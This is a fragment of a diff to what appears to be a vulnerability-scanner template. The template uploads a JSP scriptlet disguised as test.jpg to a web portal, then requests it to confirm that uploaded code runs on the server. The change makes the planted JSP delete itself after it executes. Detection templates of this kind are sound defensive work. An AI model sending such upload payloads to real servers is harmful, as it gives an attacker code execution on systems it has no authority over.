@@ -53,7 +53,7 @@ http:
         ------WebKitFormBoundary92pUawKc
         Content-Disposition: form-data; name="myFile";filename="test.jpg"
 
-        <% out.println("{{file_content}}");%>
+        <% out.println("{{file_content}}");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
         ------WebKitFormBoundary92pUawKc--
       - |
         GET /R9iPortal/{{file_name}} HTTP/1.1
